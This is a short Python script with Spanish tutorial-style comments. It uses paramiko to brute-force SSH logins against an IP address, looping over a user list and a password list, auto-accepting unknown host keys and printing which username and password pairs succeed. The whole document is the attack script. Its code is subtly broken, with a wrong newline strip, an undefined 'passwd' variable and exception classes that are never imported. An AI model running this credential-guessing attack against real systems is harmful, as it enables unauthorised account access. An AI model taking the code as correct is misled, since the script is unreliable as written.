# PARAMIKO tienen su propia pagina con documentacion muy sencilla
# Es documentacion escrita para humanos
# PRimero tenemos que installarlo con pip install paramiko
import paramiko
from paramiko import SSHClient

# Selecciono mi IP como host

host = "172.23.151.23"

users = open('users', 'r')

# Abrimos el fichero usuerios y lo leemos
while True:
    # Queremos leer el usuario sin nigunsalto de lineao pegado al siguiente ususario
    user = users.readline().rstrip('/n') # Cambiar por back slash
    
    if not user:
        break
    passwords = open('passwords','r')
    
    
    # EN este bucle vamos a ir porbando cada usuario del fichero con todas las contraseñas
    # Asi si hara con cada usuarios hasta que encontremos alguno
    while True:
        passw = passwords.readline().rstrip('/n')
    
        if not passw:
            break
        
        # conectar con PARAMIKO
        
        # utilizo la clase SSHClient para crear un cliente
        # Recordar que cuando se hace una connecion con SSH la primera vez nos pide el finger print
        # Si no puedo validar el certificado que me estan dando 
        # CUnado aceptamos el finger print se installa
        client = SSHClient()

        # La host key es el certificado que nos da el servidor
        # Entonces utilizo una politica para validarlo
        # RejectPolicy ------ Si no puedo validarlo no entro
        #AutoAddPolicy ------ Automaticamente añade el certificado. Nuestro objeto le sale el mensaje y dice :" Si, si. Confio en el certificado"
        # SI no cambio la politica queda por defecto RejectPolicy
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
        
        try:
            # Ahora nos conectamos 
            # El user es el username que estamos leyendo
            client.connect(host,username=user,password=passwd)
            print('user {} - pass {} auth OK!'.format(user,passw))
            
        except AuthenticationException:
            print('user {} - pass {} auth fallida!'.format(user,passw))
            
        except SSHException:
            print('SSH Exception')
            
    passwords.close()
users.close()
